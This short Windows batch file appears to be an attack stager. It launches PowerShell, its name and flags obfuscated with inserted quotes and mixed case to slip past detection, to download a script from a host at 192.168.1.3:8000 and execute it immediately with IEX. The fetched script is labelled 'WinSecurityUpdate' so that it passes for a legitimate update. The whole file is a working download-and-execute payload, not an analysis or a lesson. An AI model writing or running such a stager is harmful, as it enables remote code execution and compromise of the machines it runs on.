@ECHO OFF
setlocal
set URL=http://192.168.1.3:8000/WinSecurityUpdate
po""weR""sHelL -nO""p -c "& { $URL = '%URL%'; iEx(New-Object Net.WEbclIent).DoWnLOadstRinG($URL)}"
